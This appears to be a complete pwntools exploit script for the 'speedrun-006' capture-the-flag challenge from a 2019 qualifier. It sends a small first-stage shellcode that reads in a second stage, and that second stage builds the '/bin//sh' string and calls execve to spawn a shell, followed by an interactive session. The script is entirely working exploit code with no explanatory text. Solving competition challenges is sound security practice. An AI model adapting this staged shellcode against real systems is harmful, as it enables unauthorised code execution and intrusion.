from pwn import *

#sock = remote("speedrun-006.quals2019.oooverflow.io", 31337)
sock = process("speedrun-006")

shellcode = asm("""
syscall
nop
nop
mov dl, 0xcc
mov rsi, rcx
mov dl, 0xcc
syscall
""", arch="amd64")
print(disasm(shellcode, arch='amd64'))
shellcode = shellcode.replace("\xcc", "")
shellcode += '\x90' * (0x1a - len(shellcode))

_ = raw_input()
sock.send(shellcode)

shellcode = '\x90' * 20
shellcode += asm("""
mov rsp, rcx
add rsp, 0xf00

xor rax, rax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
""", arch="amd64")
sock.send(shellcode)

sock.interactive()
